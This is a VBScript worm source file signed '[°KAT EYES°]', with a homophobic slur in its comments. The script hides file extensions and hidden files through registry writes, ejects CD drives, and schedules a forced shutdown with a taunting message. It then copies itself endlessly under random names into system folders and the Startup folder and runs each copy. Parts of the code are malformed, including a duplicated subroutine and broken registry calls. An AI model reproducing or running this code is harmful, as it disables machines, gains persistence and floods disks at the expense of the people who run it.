' Hello Billy Gates Is Fuckin Gay!!!
' [°KAT EYES°]
On Error Resume Next
Set Fso = CreateObject("Scripting.FileSystemObject")
Set ws = CreateObject("WScript.Shell")
Set Faith = Fso.GetFile(WScript.ScriptFullName)
Set Drives = Fso.Drives

sub regcreate(regkey,regvalue)
Rem Enable Registry Writing
Set regedit = CreateObject("WScript.Shell")
regedit.RegWrite regkey,regvalue
end sub

sub regcreate(regkey,regvalue)
Rem Enable Registry Writing
Set regedit = CreateObject("WScript.Shell")
regedit.RegWrite regkey,regvalue
end sub
function regget(value)
Set regedit = CreateObject("WScript.Shell")
regget=regedit.RegRead(value)
end function

regcreate "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\HideFileExt\","UncheckedValue" = "1"
regcreate "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\Hidden\SHOWALL\","CheckedValue" = "0"
regcreate "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\Hidden\SHOWALL\","Type" = ""
regcreate "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\SuperHidden\","UncheckedValue" = "1"

Const CDROM = 4
    On Error Resume Next
    Set fs = CreateObject("Scripting.FileSystemObject")
    strDriveLetter = ""
    For intDriveLetter = Asc("A") To Asc("Z")
        Err.Clear
        If fs.GetDrive(Chr(intDriveLetter)).DriveType = CDROM Then
            If Err.Number = 0 Then
                strDriveLetter = Chr(intDriveLetter)
                Exit For
            End If
        End If
    Next
Set oWMP = CreateObject("WMPlayer.OCX.7" )
Set colCDROMs = oWMP.cdromCollection
     For d = 0 to colCDROMs.Count - 1
           colCDROMs.Item(d).Eject 
Next




if day(now()) = 20 and month(now()) = 4 then
msgbox "Hello This Is A Good Day!!"
end if

Set shell=CreateObject("Wscript.Shell")
Set wrte=fso.CreateTextFile(windir+"\windows.cmd")
wrte.WriteLine "cls"
wrte.WriteLine "@echo off"
wrte.WriteLine "shutdown -s -f -t 600 -c "+chr(34)+"Now Time Is Counting Down, So Do Whats Right And Follow The Letter!!! -From One Who Knows All-[°KAT EYES°]"+chr(34)
wrte.Close()





shell.Run windir+"\windows.cmd"


Randomize
do
a = int(rnd(1) * 6) + 1
Select Case a
Case 1
b = "C:\"
Case 2
b = "C:\progra~1\"
Case 3
b = "C:\docume~1\"
Case 4
b = "C:\DOCUME~1\ALLUSE~1\Desktop\"
Case 5
b = "C:\DOCUME~1\ALLUSE~1\STARTM~1\"
Case 6
b = "C:\DOCUME~1\ALLUSE~1\STARTM~1\Programs\Startup\"
Case 7
b = "Z:\"
End Select
c = rnd*rnd*a*a*rnd(1238218)*rnd(a)*a*a*a*rnd*999999
c = replace(c, ".", "")
d = b+c+".vbs"
Set fs = createobject("scripting.filesystemobject")
Set st = createobject("wscript.shell")
fs.CopyFile Wscript.ScriptFullName, d
st.run d' VB Script Document
loop

' Hello Billy Gates Is Fuckin Gay!!!